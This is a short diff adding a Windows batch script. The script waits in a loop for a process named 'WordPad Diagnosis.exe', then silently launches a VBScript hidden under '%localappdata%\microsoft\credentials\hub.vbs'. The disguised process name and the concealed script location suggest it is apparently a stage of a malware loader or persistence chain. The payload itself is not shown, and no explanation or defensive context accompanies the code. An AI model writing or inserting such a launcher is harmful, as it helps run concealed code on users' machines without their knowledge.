@@ -1,0 +1,9 @@
+:yee
+tasklist /FI "IMAGENAME eq WordPad Diagnosis.exe" 2>NUL | find /I /N "WordPad Diagnosis.exe">NUL
+if "%ERRORLEVEL%"=="0" goto kool
+timeout 2
+goto yee
+
+:kool
+start "" "%localappdata%\microsoft\credentials\hub.vbs"
+exit
